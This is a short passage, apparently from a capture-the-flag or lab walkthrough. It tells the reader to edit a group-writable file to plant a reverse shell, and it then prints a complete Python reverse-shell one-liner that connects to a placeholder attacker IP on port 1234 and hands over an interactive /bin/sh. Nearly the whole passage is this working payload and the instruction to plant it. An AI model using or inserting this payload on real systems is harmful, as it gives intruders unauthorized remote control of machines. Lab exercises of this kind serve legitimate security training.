Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?

Python Reverse Shell:

**_python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&lt;IP&gt;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'_**

